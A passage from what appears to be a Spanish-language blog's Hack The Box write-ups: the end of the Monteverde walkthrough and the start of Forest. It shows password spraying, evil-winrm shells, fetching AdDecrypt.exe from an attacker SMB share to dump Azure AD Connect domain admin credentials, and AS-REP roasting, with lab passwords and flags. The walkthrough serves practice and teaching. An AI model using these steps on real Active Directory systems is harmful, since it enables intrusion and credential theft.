dgalanos doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User roleary doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User smorgan doesn't have UF_DONT_REQUIRE_PREAUTH setAhora bien en vista que tenemos un listado potencial de usuarios validos podemos tratar de realizar fuerza bruta con crackmapexec usando la misma lista de usuarios como posibles contraseñas. ❯ crackmapexec smb 10. 10. 10. 172 -u users. txt -p users. txt --continue-on-successSMB     10. 10. 10. 172  445  MONTEVERDE    [*] Windows 10. 0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK. LOCAL) (signing:True) (SMBv1:False)SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:Guest STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:mhope STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:svc-ata STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:svc-bexec STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:svc-netapp STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:roleary STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:smorgan STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:Guest STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:Guest STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:mhope STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:roleary STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\mhope:smorgan STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\SABatchJobs:Guest STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\SABatchJobs:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\SABatchJobs:mhope STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [+] MEGABANK. LOCAL\SABatchJobs:SABatchJobs SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\SABatchJobs:svc-ata STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\SABatchJobs:svc-bexec STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\SABatchJobs:svc-netapp STATUS_LOGON_FAILURE Obtenemos unas credenciales validas SABatchJobs:SABatchJobs y con estas podemos tratar de enumerar los recursos compartidos. ❯ smbmap -H 10. 10. 10. 172 -u 'SABatchJobs' -p 'SABatchJobs'  IP: 10. 10. 10. 172:445	Name: MEGABANK. LOCAL                  	Disk                         	Permissions	Comment	----                         	-----------	-------	ADMIN$                      	NO ACCESS	Remote Admin	azure_uploads                   	READ ONLY		C$                        	NO ACCESS	Default share	E$                        	NO ACCESS	Default share	IPC$                       	READ ONLY	Remote IPC	NETLOGON                     	READ ONLY	Logon server share 	SYSVOL                      	READ ONLY	Logon server share 	users$                      	READ ONLY	Si vamos a las ruta de users$ encontramos dentro del directorio mhope un archivo azure. xml. ❯ smbmap -H 10. 10. 10. 172 -u 'SABatchJobs' -p 'SABatchJobs' -r 'users$/mhope'  IP: 10. 10. 10. 172:445	Name: MEGABANK. LOCAL                  	Disk                         	Permissions	Comment	----                         	-----------	-------	users$                      	READ ONLY		users\$mhope	dr--r--r--        0 Fri Jan 3 08:41:18 2020	. 	dr--r--r--        0 Fri Jan 3 08:41:18 2020	. . 	fw--w--w--       1212 Fri Jan 3 09:59:24 2020	azure. xmlNos descargamos el archivo y al leerlo vemos una nueva contraseña 4n0therD4y@n0th3r$ ❯ smbmap -H 10. 10. 10. 172 -u 'SABatchJobs' -p 'SABatchJobs' --download 'users$/mhope/azure. xml'[+] Starting download: users$\mhope\azure. xml (1212 bytes)[+] File output to: /home/fmiracle/machines/Monteverde/content/10. 10. 10. 172-users_mhope_azure. xml❯ mv 10. 10. 10. 172-users_mhope_azure. xml azure. xml❯ /bin/cat azure. xml&lt;Objs Version= 1. 1. 0. 1  xmlns= http://schemas. microsoft. com/powershell/2004/04 &gt; &lt;Obj RefId= 0 &gt;  &lt;TN RefId= 0 &gt;   &lt;T&gt;Microsoft. Azure. Commands. ActiveDirectory. PSADPasswordCredential&lt;/T&gt;   &lt;T&gt;System. Object&lt;/T&gt;  &lt;/TN&gt;  &lt;ToString&gt;Microsoft. Azure. Commands. ActiveDirectory. PSADPasswordCredential&lt;/ToString&gt;  &lt;Props&gt;   &lt;DT N= StartDate &gt;2020-01-03T05:35:00. 7562298-08:00&lt;/DT&gt;   &lt;DT N= EndDate &gt;2054-01-03T05:35:00. 7562298-08:00&lt;/DT&gt;   &lt;G N= KeyId &gt;00000000-0000-0000-0000-000000000000&lt;/G&gt;   &lt;S N= Password &gt;4n0therD4y@n0th3r$&lt;/S&gt;  &lt;/Props&gt; &lt;/Obj&gt;&lt;/Objs&gt;#Ya que obtuvimos una nueva credencial, vamos a hacer lo mismo que antes con Crackmapexec pero esta vez con esta contraseña. ❯ crackmapexec smb 10. 10. 10. 172 -u users. txt -p '4n0therD4y@n0th3r$' --continue-on-successSMB     10. 10. 10. 172  445  MONTEVERDE    [*] Windows 10. 0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK. LOCAL) (signing:True) (SMBv1:False)SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\Guest:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\AAD_987d7f2f57d2:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [+] MEGABANK. LOCAL\mhope:4n0therD4y@n0th3r$ SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\SABatchJobs:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\svc-ata:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\svc-bexec:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\svc-netapp:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\dgalanos:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\roleary:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE SMB     10. 10. 10. 172  445  MONTEVERDE    [-] MEGABANK. LOCAL\smorgan:4n0therD4y@n0th3r$ STATUS_LOGON_FAILURE Obtenemos nuevas credenciales validas mhope:4n0therD4y@n0th3r$ y como vimos que el puerto 5085 se encuentra abierto, podemos tratar de conectarnos con evil-winrm ❯ evil-winrm -i 10. 10. 10. 172 -u 'mhope' -p '4n0therD4y@n0th3r$'                    Evil-WinRM shell v3. 5                    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                    Data: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completion                    Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\mhope\Documents&gt; whoamimegabank\mhopeUna vez como el usuario mhpe, podemos dirigirnos a su directorio personal y visualizar la primera flag user. txt. *Evil-WinRM* PS C:\Users\mhope\Documents&gt; cd . . \Desktop*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; type user. txt603f2f5e0f8e217d541fb0572da2d55cELEVACION DE PRIVILEGIOS #: Si listamos los grupos a los cuales pertenece el usuario mhope, podemos notar que esta dentro del grupo Azure admins *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; whoami /allUSER INFORMATION----------------User Name   SID============== ============================================megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601GROUP INFORMATION-----------------Group Name                 Type       SID                     Attributes=========================================== ================ ============================================ ==================================================Everyone                  Well-known group S-1-1-0                   Mandatory group, Enabled by default, Enabled groupBUILTIN\Remote Management Users       Alias      S-1-5-32-580                 Mandatory group, Enabled by default, Enabled groupBUILTIN\Users                Alias      S-1-5-32-545                 Mandatory group, Enabled by default, Enabled groupBUILTIN\Pre-Windows 2000 Compatible Access Alias      S-1-5-32-554                 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NETWORK            Well-known group S-1-5-2                   Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\Authenticated Users      Well-known group S-1-5-11                   Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\This Organization       Well-known group S-1-5-15                   Mandatory group, Enabled by default, Enabled groupMEGABANK\Azure Admins            Group      S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled groupNT AUTHORITY\NTLM Authentication      Well-known group S-1-5-64-10                 Mandatory group, Enabled by default, Enabled groupMandatory Label\Medium Plus Mandatory Level Label      S-1-16-8448PRIVILEGES INFORMATION----------------------Privilege Name        Description          State============================= ============================== =======SeMachineAccountPrivilege   Add workstations to domain   EnabledSeChangeNotifyPrivilege    Bypass traverse checking    EnabledSeIncreaseWorkingSetPrivilege Increase a process working set EnabledUSER CLAIMS INFORMATION-----------------------User claims unknown. Cuando un usuario pertenece a un grupo Azure debemos de dirigirnos al directorio raiz, y dentro buscar directorios relacionados a Azure. *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; cd C:\*Evil-WinRM* PS C:\&gt; dir  Directory: C:\Mode        LastWriteTime     Length Name----        -------------     ------ ----d-----    9/15/2018 12:19 AM        PerfLogsd-r---     1/3/2020  5:28 AM        Program Filesd-----     1/2/2020  2:39 PM        Program Files (x86)d-r---     1/3/2020  5:24 AM        Usersd-----    10/25/2022  2:29 AM        Windows*Evil-WinRM* PS C:\&gt; cd Progra~1*Evil-WinRM* PS C:\Program Files&gt; dir  Directory: C:\Program FilesMode        LastWriteTime     Length Name----        -------------     ------ ----d-----     1/2/2020  9:36 PM        Common Filesd-----     1/2/2020  2:46 PM        internet explorerd-----     1/2/2020  2:38 PM        Microsoft Analysis Servicesd-----     1/2/2020  2:51 PM        Microsoft Azure Active Directory Connectd-----     1/2/2020  3:37 PM        Microsoft Azure Active Directory Connect Upgraderd-----     1/2/2020  3:02 PM        Microsoft Azure AD Connect Health Sync Agentd-----     1/2/2020  2:53 PM        Microsoft Azure AD Syncd-----     1/2/2020  2:38 PM        Microsoft SQL Serverd-----     1/2/2020  2:25 PM        Microsoft Visual Studio 10. 0d-----     1/2/2020  2:32 PM        Microsoft. NETd-----     1/3/2020  5:28 AM        PackageManagementd-----     1/2/2020  9:37 PM        VMwared-r---     1/2/2020  2:46 PM        Windows Defenderd-----     1/2/2020  2:46 PM        Windows Defender Advanced Threat Protectiond-----    9/15/2018 12:19 AM        Windows Maild-----     1/2/2020  2:46 PM        Windows Media Playerd-----    9/15/2018 12:19 AM        Windows Multimedia Platformd-----    9/15/2018 12:28 AM        windows ntd-----     1/2/2020  2:46 PM        Windows Photo Viewerd-----    9/15/2018 12:19 AM        Windows Portable Devicesd-----    9/15/2018 12:19 AM        Windows Securityd-----     1/3/2020  5:28 AM        WindowsPowerShellCuriosamente vemos uno de nombre Microsoft Azure AD Sync, y si investigamos un poco, encontramos un exploit de escalada de privilegios, que lo que hace concretamente es dumpear las credenciales del administrador del dominio. Te dejo aqui el articulo para que veas mas al respecto:  https://vbscrub. com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/Lo que tenemos que hacer primero es descargarnos el AdDecrypt. zip del repositorio de github.  AdSyncDecrypt - releasesLo descomprimimos y dentro vamos a tener dos archivos los cuales tenemos que subir a la maquina victima. ❯ ls AdDecrypt. zip  azure. xml  credentials. txt  users. txt❯ unzip AdDecrypt. zipArchive: AdDecrypt. zip inflating: AdDecrypt. exe       inflating: mcrypt. dll       ❯ ls AdDecrypt. exe  AdDecrypt. zip  azure. xml  credentials. txt  mcrypt. dll  users. txtNos creamos un directorio y subimos los archivos, lo que yo hare es que con smbserver crearme un recurso compartido para subirlos, pero puedes hacerlo como quieras. ❯ impacket-smbserver smbFolder $(pwd) -smb2supportImpacket v0. 9. 24 - Copyright 2021 SecureAuth Corporation[*] Config file parsed[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3. 0[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1. 0[*] Config file parsed[*] Config file parsed[*] Config file parsed*Evil-WinRM* PS C:\Users\mhope\Desktop&gt; mkdir Privesc*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&gt; copy \\10. 10. 16. 10\smbFolder\AdDecrypt. exe AdDecrypt. exe*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&gt; copy \\10. 10. 16. 10\smbFolder\mcrypt. dll mcrypt. dll*Evil-WinRM* PS C:\Users\mhope\Desktop\Privesc&gt; dir  Directory: C:\Users\mhope\Desktop\PrivescMode        LastWriteTime     Length Name----        -------------     ------ -----a----    1/13/2020  9:11 PM     14848 AdDecrypt. exe-a----    1/12/2020  6:33 PM     334248 mcrypt. dllFinalmente debemos ejecutar el siguiente comando AdDecrypt. exe -FullSQL, pero debemos hacerlo desde el siguiente directorio C:\Program Files\Microsoft Azure AD Sync\Bin. Ahora recordemos que debemos ejecutar el AdSyncDecrypt. exe desde la ruta donde lo subimos. *Evil-WinRM* PS C:\Program Files\Microsoft Azure AD Sync\Bin&gt; C:\Users\mhope\Desktop\Privesc\AdDecrypt. exe -FullSQL======================AZURE AD SYNC CREDENTIAL DECRYPTION TOOLBased on original code from: https://github. com/fox-it/adconnectdump======================Opening database connection. . . Executing SQL commands. . . Closing database connection. . . Decrypting XML. . . Parsing XML. . . Finished!DECRYPTED CREDENTIALS:Username: administratorPassword: d0m@in4dminyeah!Domain: MEGABANK. LOCALValidamos las credenciales administrativas administrator:d0m@in4dminyeah!. ❯ crackmapexec smb 10. 10. 10. 172 -u 'administrator' -p 'd0m@in4dminyeah!'SMB     10. 10. 10. 172  445  MONTEVERDE    [*] Windows 10. 0 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK. LOCAL) (signing:True) (SMBv1:False)SMB     10. 10. 10. 172  445  MONTEVERDE    [+] MEGABANK. LOCAL\administrator:d0m@in4dminyeah! (Pwn3d!)Nos conectamos como el usuario administrator con Evil-WinRM y podemos visualizar la segunda flag root. txt. ❯ evil-winrm -i 10. 10. 10. 172 -u 'administrator' -p 'd0m@in4dminyeah!'                    Evil-WinRM shell v3. 5                    Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                    Data: For more information, check Evil-WinRM GitHub: https://github. com/Hackplayers/evil-winrm#Remote-path-completion                    Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd . . \Desktop*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root. txt6154d420f50cd70c919a6fb1e96e56fcy listo maquina finiquitada! 😆 "
    }, {
    "id": 14,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Forest",
    "title": "Maquina Forest - htb writeup",
    "body": "2023/10/11 - El dia de hoy vamos a resolver Forest de hackthebox una maquina windows de dificultad facil, en esta ocasión vamos a enfrentarnos contra un DC donde enumeraremos usuarios a traves de rpc y mediante un As-RepRoast attack solicitando un TGT obtendremos unas crendenciales hasheadas que creackearemos por fuerza bruta para conectarnos por winrm a el equipo; despues enumerando el sistema con Bloodhound nos aprovecharemos de los permisos del grupo Account Operators para crear un usuario en el dominio y efectuar un Dcsync attack donde dumpearemos los hashes de las cuentas del dominio y podremos ganar acceso como el usuario Administrator. Maquina curiosa asi que vamos a darle!. Vamos a comenzar como de costumbre creando un directorio con el nombre de la maquina: ❯ mkdir Forest❯ ls ForestSeguidamente con la funcion mkt crearemos nuestros directorios de trabajo: ❯ which mktmkt () {	mkdir {nmap,content,exploits,scripts}}❯ mkt❯ ls content  exploits  nmap  scriptsENUMERACION #: Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 161PING 10. 10. 10. 161 (10. 10. 10. 161) 56(84) bytes of data. 64 bytes from 10. 10. 10. 161: icmp_seq=1 ttl=127 time=113 ms--- 10. 10. 10. 161 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 113. 161/113. 161/113. 161/0. 000 msVemos que la maquina nos responde, con un ttl de 127 y por proximidad seria correspondiente a una maquina windows. ESCANEO DE PUERTOS:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 161 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 93 ( https://nmap. org ) at 2023-10-09 11:56 -05Initiating SYN Stealth Scan at 11:56Scanning 10. 10. 10. 161 [65535 ports]Nmap scan report for 10. 10. 10. 161Host is up, received user-set (0. 12s latency). Scanned at 2023-10-09 11:56:58 -05 for 21sNot shown: 65290 closed tcp ports (reset), 221 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE     REASON53/tcp  open domain      syn-ack ttl 12788/tcp  open kerberos-sec   syn-ack ttl 127135/tcp  open msrpc      syn-ack ttl 127139/tcp  open netbios-ssn   syn-ack ttl 127389/tcp  open ldap       syn-ack ttl 127445/tcp  open microsoft-ds   syn-ack ttl 127464/tcp  open kpasswd5     syn-ack ttl 127593/tcp  open http-rpc-epmap  syn-ack ttl 127636/tcp  open ldapssl     syn-ack ttl 1273268/tcp open globalcatLDAP  syn-ack ttl 1273269/tcp open globalcatLDAPssl syn-ack ttl 1275985/tcp open wsman      syn-ack ttl 1279389/tcp open adws       syn-ack ttl 12747001/tcp open winrm      syn-ack ttl 12749664/tcp open unknown     syn-ack ttl 12749665/tcp open unknown     syn-ack ttl 12749666/tcp open unknown     syn-ack ttl 12749667/tcp open unknown     syn-ack ttl 12749671/tcp open unknown     syn-ack ttl 12749676/tcp open unknown     syn-ack ttl 12749677/tcp open unknown     syn-ack ttl 12749684/tcp open unknown     syn-ack ttl 12749706/tcp open unknown     syn-ack ttl 12749934/tcp open unknown     syn-ack ttl 127Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 21. 18 seconds      Raw packets sent: 104093 (4. 580MB) | Rcvd: 86582 (3. 463MB)ESCANEO DE VERSION Y SERVICIOS: # Nmap 7. 93 scan initiated Mon Oct 9 11:58:50 2023 as: nmap -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49934 -oN targeted 10. 10. 10. 161Nmap scan report for 10. 10. 10. 161Host is up (0. 22s latency). PORT   STATE SERVICE   VERSION53/tcp  open domain    Simple DNS Plus88/tcp  open kerberos-sec Microsoft Windows Kerberos (server time: 2023-10-09 17:05:41Z)135/tcp  open msrpc    Microsoft Windows RPC139/tcp  open netbios-ssn Microsoft Windows netbios-ssn389/tcp  open ldap     Microsoft Windows Active Directory LDAP (Domain: htb. local, Site: Default-First-Site-Name)445/tcp  open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)464/tcp  open kpasswd5?593/tcp  open ncacn_http  Microsoft Windows RPC over HTTP 1. 0636/tcp  open tcpwrapped3268/tcp open ldap     Microsoft Windows Active Directory LDAP (Domain: htb. local, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found9389/tcp open mc-nmf    . NET Message Framing47001/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2. 049664/tcp open msrpc    Microsoft Windows RPC49665/tcp open msrpc    Microsoft Windows RPC49666/tcp open msrpc    Microsoft Windows RPC49667/tcp open msrpc    Microsoft Windows RPC49671/tcp open msrpc    Microsoft Windows RPC49676/tcp open ncacn_http  Microsoft Windows RPC over HTTP 1. 049677/tcp open msrpc    Microsoft Windows RPC49684/tcp open msrpc    Microsoft Windows RPC49706/tcp open msrpc    Microsoft Windows RPC49934/tcp open msrpc    Microsoft Windows RPCService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: required| smb2-security-mode: |  311: |_  Message signing enabled and required| smb-os-discovery: |  OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6. 3)|  Computer name: FOREST|  NetBIOS computer name: FOREST\x00|  Domain name: htb. local|  Forest name: htb. local|  FQDN: FOREST. htb. local|_ System time: 2023-10-09T10:06:39-07:00| smb2-time: |  date: 2023-10-09T17:06:35|_ start_date: 2023-10-09T14:03:53|_clock-skew: mean: 2h26m44s, deviation: 4h02m32s, median: 6m42sService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Mon Oct 9 12:00:09 2023 -- 1 IP address (1 host up) scanned in 78. 92 secondsEntre los puertos abiertos mas relevantes podemos visualizar:       Puerto   Servicio   Versión         53   DNS   Simple DNS Plus       88   KERBEROS   Microsoft Windows Kerberos       135   MSRPC   Microsoft Windows RPC       139   NETBIOS   Microsoft Windows netbios-ssn       389   LDAP   Microsoft Windows Active Directory LDAP       445   SMB   Windows Server 2016 Standard       3268   LDAP   Microsoft Windows Active Directory LDAP       5985   WINRM   Microsoft HTTPAPI httpd 2. 0   EXPLOTACION #: Como vemos que el puerto 445 esta abierto, con crackpamexec podemos tratar de enumerar a lo que nos enfrentamos. ❯ crackmapexec smb 10. 10. 10. 161SMB     10. 10. 10. 161  445  FOREST      [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb. local) (signing:True) (SMBv1:True)Vemos que nos enfrentamos a un Windows Server 2016 y que el smb esta firmado, ahora bien vamos a proceder a agregar el dominio a nuestro /etc/hosts. ❯ echo  10. 10. 10. 161 htb. local  &gt;&gt; /etc/hostsAhora al tratarse de un Domain Controller podemos tratar de enumerar usuarios validos con rpclient a traves de un null session. ❯ rpcclient -U '' 10. 10. 10. 161 -N -c 'enumdomusers' | grep -oP '\[. *?\]' | grep -v '0x' | tr -d '[]'AdministratorGuestkrbtgtDefaultAccount$331000-VK4ADACQNUCASM_2c8eef0a09b545acbSM_ca8c2ed5bdab4dc9bSM_75a538d3025e4db9aSM_681f53d4942840e18SM_1b41c9286325456bbSM_9b69f1b9d2cc45549SM_7c96b981967141ebbSM_c75ee099d0a64c91bSM_1ffab36a2f5f479cbHealthMailboxc3d7722HealthMailboxfc9daadHealthMailboxc0a90c9HealthMailbox670628eHealthMailbox968e74dHealthMailbox6ded678HealthMailbox83d6781HealthMailboxfd87238HealthMailboxb01ac64HealthMailbox7108a4eHealthMailbox0659cc1sebastienlucindasvc-alfrescoandymarksantiComo tenemos un listado potencial de usuarios, podemos tratar de efectuar un ASREProast Attack para tratar de obtener un TGT - ticket granting ticket que basicamente se traduce a un hash que podemos tratar de crackear. Para ello vamos a exportar los usuarios obtenidos en un archivo. ❯ GetNPUsers. py -no-pass -usersfile users htb. local/Impacket v0. 11. 0 - Copyright 2023 Fortra[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$23$svc-alfresco@HTB. 